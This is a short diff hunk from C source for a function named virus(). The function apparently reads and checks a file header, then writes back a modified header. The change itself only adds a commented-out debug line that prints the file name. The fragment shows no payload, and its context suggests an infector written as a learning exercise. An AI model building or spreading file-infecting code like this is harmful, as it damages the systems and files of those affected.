@@ -12,6 +12,7 @@ void virus(char *file) {
     if (bytes_rd < 0x40 || check_file(fHdr) != 0)
         return;
 
+    // ft_syscall((void *)1, (void *)file, (void *)ft_strlen(file), 0, WRITE);
     writeFile(fd, fHdr);
     ft_syscall((void *)fd, 0, 0, 0, CLOSE);
 }
